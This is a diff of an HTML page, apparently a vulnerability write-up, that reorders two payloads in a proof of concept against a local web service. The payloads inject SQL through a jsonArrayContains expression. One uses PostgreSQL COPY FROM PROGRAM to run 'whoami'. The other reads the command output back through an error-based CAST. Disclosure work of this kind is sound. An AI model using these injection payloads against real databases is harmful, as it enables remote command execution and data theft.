@@ -312,7 +312,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8080</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">poc</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
-</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') AND CAST((SELECT chr(126)||(SELECT encode(convert_to(COALESCE(string_agg(output, chr(10)), ''[Empty Output]''), ''UTF8''), ''hex'') FROM cmd_out_tmp)||chr(126)) AS NUMERIC)=1 OR (''1''=''1') = true</code></p>
+</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') ) ; COMMIT; DROP TABLE IF EXISTS cmd_out_tmp; CREATE TABLE cmd_out_tmp(output text); COPY cmd_out_tmp(output) FROM PROGRAM ''whoami''; COMMIT; --') = true</code></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -327,7 +327,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">localhost</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8080</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Agent</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">poc</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Connection</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">keep</span><span style="color:#f92672">-</span><span style="color:#a6e22e">alive</span>
-</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') ) ; COMMIT; DROP TABLE IF EXISTS cmd_out_tmp; CREATE TABLE cmd_out_tmp(output text); COPY cmd_out_tmp(output) FROM PROGRAM ''whoami''; COMMIT; --') = true</code></p>
+</span></span></code></pre></div><p><code>jsonArrayContains(&quot;data&quot;, '/a', 'x&quot;)'') AND CAST((SELECT chr(126)||(SELECT encode(convert_to(COALESCE(string_agg(output, chr(10)), ''[Empty Output]''), ''UTF8''), ''hex'') FROM cmd_out_tmp)||chr(126)) AS NUMERIC)=1 OR (''1''=''1') = true</code></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
